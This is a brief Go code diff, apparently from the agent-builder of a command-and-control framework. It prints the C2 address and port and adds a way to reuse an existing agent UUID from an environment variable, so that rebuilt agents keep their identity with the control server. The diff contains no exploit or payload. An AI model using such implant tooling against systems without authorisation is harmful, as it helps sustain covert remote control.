@@ -63,8 +63,14 @@ func main() {
 	fmt.Printf("C2 Address: %s\n", live.RuntimeConfig.CCAddress)
 	fmt.Printf("H2 Port: %s\n", live.RuntimeConfig.CCH2Port)
 
-	// Generate UUID
+	// Generate UUID (or reuse one via --uuid for identity-continuous updates:
+	// same UUID + same password → the new binary derives the same key-cache
+	// KEK, decrypts the previous identity, and the CC's TOFU pin stays valid)
 	agentUUID := uuid.NewString()
+	if reused := os.Getenv("EMP_AGENT_UUID"); reused != "" {
+		agentUUID = reused
+		fmt.Printf("Reusing agent UUID from EMP_AGENT_UUID: %s\n", agentUUID)
+	}
 	fmt.Printf("Agent UUID: %s\n", agentUUID)
 
 	// Sign UUID with CA private key
